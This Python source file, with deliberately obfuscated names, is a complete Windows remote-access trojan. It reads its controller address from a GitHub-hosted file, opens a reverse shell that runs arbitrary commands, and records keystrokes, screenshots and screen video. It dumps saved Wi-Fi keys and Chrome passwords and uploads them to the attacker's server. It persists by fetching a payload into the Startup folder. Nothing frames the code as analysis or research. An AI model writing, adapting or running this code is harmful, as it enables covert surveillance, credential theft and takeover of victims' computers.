import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
gSfKZrYOESuqpVSvf = ""
sJiHIiD = ""
NgNgIbmAPa = "17.12.24.4"
qkvIQgbjZxlMz = "!"
RewFTcAzL = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
lhZqZOACaUecPnQzRbS = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
RvoZYwLJQbkHtdkWUL = os.path.expanduser("~\\AppData\\Local\\")
def CsKvzDnFauqLGGyQ(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def DWMrQAwiXiqEX(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	oRWEThpYDSbIWEavBDEI = data.decode("utf-8").replace("\n","")
	if not oRWEThpYDSbIWEavBDEI.startswith(qkvIQgbjZxlMz):
		proc = subprocess.run(oRWEThpYDSbIWEavBDEI, shell=True, capture_output=True)
		EoCkLJakc = proc.stdout + proc.stderr
		s.send(EoCkLJakc)
		return
	iNDjXDRtlQWNFLaRgoOBo = oRWEThpYDSbIWEavBDEI.split(" ")[0][1:]
	args = " ".join(oRWEThpYDSbIWEavBDEI.split()[1:]).split()
	if iNDjXDRtlQWNFLaRgoOBo == "download":
		CltPQDdcz(s, oRWEThpYDSbIWEavBDEI)
	elif iNDjXDRtlQWNFLaRgoOBo == "screenshot":
		JptPyMlIH(s)
	elif iNDjXDRtlQWNFLaRgoOBo == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif iNDjXDRtlQWNFLaRgoOBo == "update":
		WgkuVTXUvkua(s)
	elif iNDjXDRtlQWNFLaRgoOBo == "wifi":
		irLYqkBDhzGBgsInslYUxw(s)
	elif iNDjXDRtlQWNFLaRgoOBo == "screenrecord":
		VjmLaimeHtFQmtGiygx(s, args)
	elif iNDjXDRtlQWNFLaRgoOBo == "chrome":
		decryptPasswords(s)
def CltPQDdcz(s, oRWEThpYDSbIWEavBDEI):
	wZxIlkhyoNOfh = oRWEThpYDSbIWEavBDEI.replace(qkvIQgbjZxlMz+"download ","").split(",")
	EoCkLJakcs = ""
	for f in wZxIlkhyoNOfh:
		EoCkLJakcs += pSZvKFWoiUMarf(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(EoCkLJakcs, "utf-8"))
def JptPyMlIH(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	UhhjDApfWCmohjcntw = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(UhhjDApfWCmohjcntw)
	image.close()
	r = pSZvKFWoiUMarf(UhhjDApfWCmohjcntw, "api/sscap")
	os.remove(UhhjDApfWCmohjcntw)
	s.send(bytes(r,"utf-8"))
def VjmLaimeHtFQmtGiygx(s, args):
	cSPIIrXrKjmIuCEtTSfM = 15
	if not args == []:
		try: cSPIIrXrKjmIuCEtTSfM = int(args[0])
		except: pass
	rdDFdotjFXWCsrevOMxoCK = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	xcgYGzOfhNz = []
	fps = 11
	numFrames = cSPIIrXrKjmIuCEtTSfM * fps
	for _ in range(numFrames):
		xcgYGzOfhNz.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(rdDFdotjFXWCsrevOMxoCK, xcgYGzOfhNz, fps=fps, quality=8)
	pSZvKFWoiUMarf(rdDFdotjFXWCsrevOMxoCK, "api/screc")
def pSZvKFWoiUMarf(QYqpHstMsmhNH, TSHHkkXbzFGNsPxeRgil, RmqQGhGtISyqHtRIdZEFxgW=None):
	if not os.path.isfile(QYqpHstMsmhNH):
		return "[!] 404: "+QYqpHstMsmhNH+"\n"
	headers = {"user":os.getlogin()}
	if RmqQGhGtISyqHtRIdZEFxgW is not None:
		headers = {**headers, **RmqQGhGtISyqHtRIdZEFxgW}
	f = open(QYqpHstMsmhNH, "rb")
	requests.post("http://"+gSfKZrYOESuqpVSvf+":5555/"+TSHHkkXbzFGNsPxeRgil,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def uploadData(dataToSend, TSHHkkXbzFGNsPxeRgil):
	if dataToSend.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+gSfKZrYOESuqpVSvf+":5555/"+TSHHkkXbzFGNsPxeRgil,
		data=dataToSend,
		headers={"user":os.getlogin()})
	return "[+] 200\n"
def WgkuVTXUvkua(s):
	h, p, v = ZvBAYjGrgaiYv(True)
	if (v != NgNgIbmAPa):
		SBecPYQuHiok(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def irLYqkBDhzGBgsInslYUxw(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	kBZZhdXxLvWmf = ""
	for p in profiles:
		try: kBZZhdXxLvWmf+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: kBZZhdXxLvWmf+=f"    {p} - N/A\n"
	s.send(bytes(kBZZhdXxLvWmf, "utf-8"))
def SBecPYQuHiok(XNXwLHtzE):
	vNsisFBtDWzuuMzPLF = os.path.basename(__file__)
	fileType = vNsisFBtDWzuuMzPLF.split(".")[-1]
	bzJlDNToQYHGqPn = vNsisFBtDWzuuMzPLF.split(".")[0]+"."+XNXwLHtzE+".pyw" if fileType.startswith("py") else ".exe"
	ZPouxEWJt = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), bzJlDNToQYHGqPn)
	if not os.path.isfile(ZPouxEWJt):
		with open(ZPouxEWJt, "w+") as f:
			f.write(requests.get(lhZqZOACaUecPnQzRbS+"file."+ "pyw" if ZPouxEWJt.split(".")[-1].startswith("py") else "exe").text)
def ZvBAYjGrgaiYv(force=False):
	global gSfKZrYOESuqpVSvf, sJiHIiD
	if force or gSfKZrYOESuqpVSvf == "" or sJiHIiD == "":
		data = requests.get(RewFTcAzL).text.replace("\n","").split(":")
		gSfKZrYOESuqpVSvf = data[0].strip()
		sJiHIiD = data[1].strip()
		XNXwLHtzE = data[2].strip()
	return gSfKZrYOESuqpVSvf, sJiHIiD, XNXwLHtzE
def kiUvOjVX():
	try:
		jZwcbLihPHt = "settings.xpb"
		kDkbyqUfNH = sorted([file for file in os.listdir(RvoZYwLJQbkHtdkWUL) if os.path.isfile(RvoZYwLJQbkHtdkWUL+"\\"+file) and file.endswith(jZwcbLihPHt.split(".")[-1])])
		if jZwcbLihPHt in kDkbyqUfNH:
			kDkbyqUfNH.remove(jZwcbLihPHt)
		MdtzkCJN = os.path.join(RvoZYwLJQbkHtdkWUL,jZwcbLihPHt)
		if len(kDkbyqUfNH) > 0:
			with open(MdtzkCJN, "ab+") as f:
				for file in kDkbyqUfNH:
					temp = os.path.join(RvoZYwLJQbkHtdkWUL,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		pSZvKFWoiUMarf(MdtzkCJN, "api/log")
		if os.path.isfile(MdtzkCJN):
			os.remove(MdtzkCJN)
	except:
		pass
def twPKfghPg():
	logging.basicConfig(filename=(RvoZYwLJQbkHtdkWUL+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def KxQGSFkpUp(k):
		logging.info(str(k))
	k=Listener(on_press=KxQGSFkpUp)
	LXnTiUyLZFKFDNWNoAM = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in LXnTiUyLZFKFDNWNoAM:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s, upload=False):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	shutil.copyfile(basePath+"\\Default\\Login Data", local+"\\db.db")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for _, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.remove(local+"\\db.db")
	data = "\n"
	for login in logins:
		data += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	if not upload:
		s.send(bytes(data,"utf-8"))
	else:
		uploadData(data, "api/google")
def Wvtvruluwi():
	h, p, v = ZvBAYjGrgaiYv()
	kiUvOjVX()
	decryptPasswords(None,True)
	if NgNgIbmAPa != v:
		SBecPYQuHiok(v)
	twPKfghPg()
	TBVIDFnozScWfEaRCPp = bytes(("(old)"if NgNgIbmAPa!=v else "")+"["+NgNgIbmAPa+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				tjNnqGdyIKlwhGNlEc=False
				try:
					s=CsKvzDnFauqLGGyQ(h, p)
					while not tjNnqGdyIKlwhGNlEc:
						s.send(TBVIDFnozScWfEaRCPp)
						tjNnqGdyIKlwhGNlEc=DWMrQAwiXiqEX(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
Wvtvruluwi()
